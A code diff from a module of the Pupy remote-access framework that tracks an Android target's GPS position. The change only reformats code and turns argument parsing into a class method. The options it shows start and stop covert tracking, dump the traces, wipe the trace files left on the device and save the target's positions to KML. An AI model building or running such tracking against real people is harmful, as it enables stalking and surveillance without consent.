@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -49,7 +49,7 @@ KML_PLACEMARK = """<Placemark>
             <LineString>
                 <tessellate>1</tessellate>
                 <altitudeMode>clampToGround</altitudeMode>
-                <coordinates> 
+                <coordinates>
                 MY_COORDINATE_1
                 MY_COORDINATE_2
                 </coordinates>
@@ -77,24 +77,25 @@ def generateKML(deviceName, traces, outputFile):
     f = open(outputFile, 'w')
     f.write(kmlData)
     f.close()
-        
+
 @config(cat="gather", compat=["android"])
 class gpstracker(PupyModule):
     """ to interact with gps """
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='gpstracker', description=self.__doc__)
-        self.arg_parser.add_argument('--start', action='store_true', help='start')
-        self.arg_parser.add_argument('--stop', action='store_true', help='stop')
-        self.arg_parser.add_argument('--status', action='store_true', help='status')
-        self.arg_parser.add_argument('--dump', action='store_true', help='dump')
-        self.arg_parser.add_argument('--clean', action='store_true', help='delete trace file stored on device')
-        self.arg_parser.add_argument('-m', '--in-memory', action='store_true', help='traces stored in memory on the device (and not in file)')
-        self.arg_parser.add_argument('-g', '--get-position', action='store_true', help='get current position')
-        self.arg_parser.add_argument('-e', '--is-GPS-enabled', action='store_true', help='is GPS enabled?')
-        self.arg_parser.add_argument('-n', '--is-network-rovider-enabled', action='store_true', help='is Network Provider enabled?')
-        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
-        self.arg_parser.add_argument("-p", '--period', type=int, default=15, help="delay between each gps position (default: %(default)s)")
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='gpstracker', description=cls.__doc__)
+        cls.arg_parser.add_argument('--start', action='store_true', help='start')
+        cls.arg_parser.add_argument('--stop', action='store_true', help='stop')
+        cls.arg_parser.add_argument('--status', action='store_true', help='status')
+        cls.arg_parser.add_argument('--dump', action='store_true', help='dump')
+        cls.arg_parser.add_argument('--clean', action='store_true', help='delete trace file stored on device')
+        cls.arg_parser.add_argument('-m', '--in-memory', action='store_true', help='traces stored in memory on the device (and not in file)')
+        cls.arg_parser.add_argument('-g', '--get-position', action='store_true', help='get current position')
+        cls.arg_parser.add_argument('-e', '--is-GPS-enabled', action='store_true', help='is GPS enabled?')
+        cls.arg_parser.add_argument('-n', '--is-network-rovider-enabled', action='store_true', help='is Network Provider enabled?')
+        cls.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
+        cls.arg_parser.add_argument("-p", '--period', type=int, default=15, help="delay between each gps position (default: %(default)s)")
 
     def run(self, args):
         self.client.load_package("pupydroid.gpsTracker")
